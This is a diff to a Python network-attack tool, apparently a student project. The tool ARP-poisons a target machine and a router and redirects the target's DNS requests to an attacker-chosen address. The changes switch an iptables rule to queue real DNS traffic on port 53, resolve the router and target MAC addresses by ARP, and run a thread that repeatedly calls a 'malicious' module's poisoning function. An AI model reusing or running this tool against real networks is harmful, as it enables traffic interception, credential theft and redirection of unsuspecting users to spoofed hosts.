@@ -30,7 +30,7 @@ import sys
 import threading
 
 targetIPAddress = "192.168.0.7"
-hostIPAddress = "192.168.0.8"
+routerIPAddress = "192.168.0.8"
 
 #########################################################################################################
 # FUNCTION
@@ -65,7 +65,7 @@ def parseArguments():
     parser = argparse.ArgumentParser()
 
     parser.add_argument("-d", "--domain", help="Choose the domain to spoof. Example: -d milliways.bcit.ca")
-    parser.add_argument("-i", "--hostIP", help="Choose the host IP. Example: -i 192.168.0.8", default=hostIPAddress)
+    parser.add_argument("-i", "--routerIP", help="Choose the host IP. Example: -i 192.168.0.8", default=routerIPAddress)
     parser.add_argument("-t", "--targetIP", help="Choose the target IP. Example: -t 192.168.0.8", default=targetIPAddress)
     parser.add_argument("-r", "--redirect", help="Optional. Choose the redirect IP or otherwise default to attacker IP. Requires -d or -a. Example: -r 192.168.0.8")
     parser.add_argument("-a", "--all", help="Spoof every DNS request back to the attacker or use optional argument -r to specify an IP to redirect to.", action="store_true")
@@ -156,7 +156,7 @@ def getMACAddress(ipAddress):
 #########################################################################################################
 def main(arguments):
 
-    global targetMACAddress, hostMACAddress
+    global targetMACAddress, routerMACAddress
     
     #test so that the user is running as root
     #required as we will be altering the iptables
@@ -166,7 +166,7 @@ def main(arguments):
     #Explanation on iptables
     #PREROUTING: the chain will catch packets before they're given routing rules 
     #so it can catch all packets from the target machine
-    os.system('iptables -t nat -A PREROUTING -p udp --dport 8000 -j  NFQUEUE --queue-num 1') 
+    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j  NFQUEUE --queue-num 1') 
     
     ipForward = open('/proc/sys/net/ipv4/ip_forward', 'r+')
     ipForwardReadContents = ipForward.read()
@@ -174,21 +174,15 @@ def main(arguments):
         ipForward.write('1\n')
     ipForward.close()
 
-    # Find the hardware address associated with the host IP, if any
-    try:
-        hostAddrPacked = inet_pton(socket.AF_INET, arguments.hostIP)
-    except Exception as err:
-        sys.exit("Host IP {} is invalid. Please enter a valid IPv4 address.".format(arguments.hostIP))
-    hostMACAddress = next( (get_if_hwaddr(ifname) for ifname in get_if_list() if get_if_raw_addr(ifname) == hostAddrPacked), None)
-    if not hostMACAddress:
-        sys.exit("No MAC Address for Host. Exiting program")        
-
     # Send ARP request to find the target MAC
+    routerMACAddress = getMACAddress(arguments.routerIP)
     targetMACAddress = getMACAddress(arguments.targetIP)
+    if not routerMACAddress:
+        sys.exit("No MAC Address for Host. Exiting program")
     if targetMACAddress == None:
         sys.exit("No MAC Address for Target. Exiting program")
     else:
-        print("Host MAC Address: ", hostMACAddress)
+        print("Host MAC Address: ", routerMACAddress)
         print("Target MAC Address: ", targetMACAddress)
 
     # Create a new thread to poison the host's ARP cache, then read and respond to their DNS queries
@@ -197,7 +191,7 @@ def main(arguments):
 
     def poisonThreadFunc():
         while runEvent.is_set():
-            malicious.ARPPoisonVictim(arguments.hostIP, arguments.targetIP, hostMACAddress, targetMACAddress)
+            malicious.ARPPoisonVictim(arguments.routerIP, arguments.targetIP, routerMACAddress, targetMACAddress)
             time.sleep(1.5)
 
     poisonThread = threading.Thread(target=poisonThreadFunc)
